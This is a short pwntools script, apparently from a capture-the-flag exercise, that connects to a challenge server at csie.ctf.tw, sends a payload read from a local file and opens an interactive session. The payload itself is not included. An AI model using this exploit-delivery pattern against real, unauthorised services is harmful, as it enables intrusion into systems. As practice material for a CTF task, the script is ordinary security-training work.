from pwn import *
context(arch = 'i386', os = 'linux')

r = remote('csie.ctf.tw', 10120)
payload = open('./payload')
payload = (payload.read())
r.sendline(payload)
r.interactive()
